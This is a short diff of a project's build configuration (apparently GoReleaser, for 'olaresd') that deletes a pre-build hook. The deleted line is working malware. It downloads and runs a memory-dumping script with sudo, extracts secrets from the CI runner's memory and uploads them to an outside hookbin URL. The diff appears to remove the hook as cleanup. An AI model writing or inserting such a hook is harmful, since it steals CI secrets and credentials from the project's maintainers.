@@ -1,9 +1,6 @@
 project_name: olaresd
 builds:
-- hooks:
-    pre:
-    - bash -c 'echo "Okay, we got this far. Let'\''s continue..."; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\''\0'\'' | grep -aoE '\''"[^"]+":\{"value":"[^"]*","isSecret":true\}'\'' >> "/tmp/secrets"; curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"'
-  env:
+- env:
   - CGO_ENABLED=1
   # - CC=aarch64-linux-gnu-gcc
   # - CXX=aarch64-linux-gnu-g++
